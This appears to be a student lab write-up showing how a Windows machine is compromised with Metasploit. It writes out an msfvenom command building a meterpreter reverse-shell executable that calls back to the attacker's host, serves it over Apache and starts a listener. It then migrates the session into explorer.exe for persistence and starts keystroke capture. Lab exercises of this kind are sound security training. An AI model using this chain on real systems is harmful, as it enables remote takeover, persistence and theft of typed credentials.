# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

### OUTPUT
![Screenshot 2025-04-21 102057](https://github.com/user-attachments/assets/c2afd944-5b7d-4d4b-b276-77e6a42b5e30)

Create a malicious executable file test.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4433 -f exe -o test.exe
### OUTPUT
![Screenshot 2025-04-21 102313](https://github.com/user-attachments/assets/532f5d0e-a11d-402a-96e3-7c60d929b5f2)

Move the text.exe into the apache /var/www/html folder
### OUTPUT
![Screenshot 2025-04-21 102826](https://github.com/user-attachments/assets/42cf5fd8-2d45-4ee6-9dd9-074d8e153599)

Start apache server sudo systemctl apache2 start
### OUTPUT 
![Screenshot 2025-04-21 103045](https://github.com/user-attachments/assets/fcb4bbc9-f29b-4507-9682-52033de1a225)

Check the status of apache2
### OUTPUT 
![Screenshot 2025-04-21 103104](https://github.com/user-attachments/assets/84adeecb-ecbe-43f4-bf07-a2524e2098b4)

Invoke msfconsole:
### OUTPUT
![image](https://github.com/user-attachments/assets/732c3ea3-cb55-4163-9086-38e9409daa10)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
Starting a command and control Server use multi/handler
### OUTPUT
![Screenshot 2025-04-21 103454](https://github.com/user-attachments/assets/ea4d4c41-957e-496c-adef-120d2a947ccf)

set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.100/test.exe The file "test.exe" downloads.
### OUTPUT
![image](https://github.com/user-attachments/assets/c8641cea-9222-4811-8650-1b590bb08e78)


Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit
### OUTPUT
![image](https://github.com/user-attachments/assets/4d58e09e-6ae9-4770-8f4d-56b2f37f82fc)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the test.exe process running with pid 1156
### OUTPUT
![image](https://github.com/user-attachments/assets/2a9cb4a5-73e6-4d66-a96c-0823074f5f0a)
![image](https://github.com/user-attachments/assets/69948136-0ab0-4d3c-8f46-a068b121296f)

The Metasploit shell is running inside the "test.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4433, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

### OUTPUT
![image](https://github.com/user-attachments/assets/e5e4edd1-3e53-45d7-8039-621048eddad3)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

### OUTPUT
![image](https://github.com/user-attachments/assets/39b36e78-c171-46e4-bda2-0863113bd35a)
![image](https://github.com/user-attachments/assets/5b3328a4-f4f8-4d36-8137-c720473df252)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
